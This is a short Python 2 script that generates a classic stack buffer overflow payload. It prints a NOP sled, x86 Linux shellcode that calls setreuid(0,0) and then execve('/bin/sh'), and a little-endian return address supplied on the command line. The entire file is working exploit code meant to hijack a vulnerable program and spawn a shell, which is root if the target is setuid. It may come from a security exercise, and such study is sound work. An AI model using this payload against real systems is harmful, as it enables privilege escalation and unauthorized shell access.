import sys

if __name__ == "__main__":
    if (len(sys.argv) != 3):
        print "Usage: " + sys.argv[0] + " length address"
        exit(-1)

    try:
        length = int(sys.argv[1])
    except:
        print "Length should be a number"
        exit(-1)
    if length <= 0:
        print "Length should be a povitive number"
        exit(-1)

    address = sys.argv[2]
    if address[:2] != "0x":
        print "Address should be in hex format"
        exit(-1)
    address = address[2:]
    if len(address) != 8:
        print "Address should be 32 bits"
        exit(-1)
    try:
        address = [chr(int(address[2*i:2*i+2], 16)) for i in range(4)]
        address.reverse()
        address = "".join(address)
    except:
        print "Address is not invalid hex"
        exit(-1)

    shellcode = "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4e\x41\x41\x41\x41\x42\x42\x42\x42"
    nop = "\x90"

    nop_size = length - len(address) - len(shellcode)

    print nop * nop_size + shellcode + address
